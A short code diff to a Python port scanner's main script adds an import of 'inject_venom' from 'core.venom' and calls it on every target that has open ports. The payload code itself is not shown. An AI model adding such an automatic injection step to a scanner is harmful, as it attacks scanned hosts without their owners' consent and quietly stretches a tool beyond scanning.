@@ -8,7 +8,7 @@ from core.scanner import start_scan
 from core.database import initialize_db, save_scan_result, get_last_scan_ports
 from utils.reporter import save_json_report, save_html_report
 from utils.colors import Color
-
+from core.venom import inject_venom
 
 def display_banner():
     banner = r"""
@@ -83,6 +83,8 @@ def main():
     try:
         open_ports = start_scan(target_ip, ports, args.threads)
         print(f"\n[*] Scan complete. Found {len(open_ports)} open ports.")
+        if open_ports:
+            inject_venom(target_ip, open_ports)
     except KeyboardInterrupt:
         print("\n[!] Scan interrupted by user.")
         sys.exit()
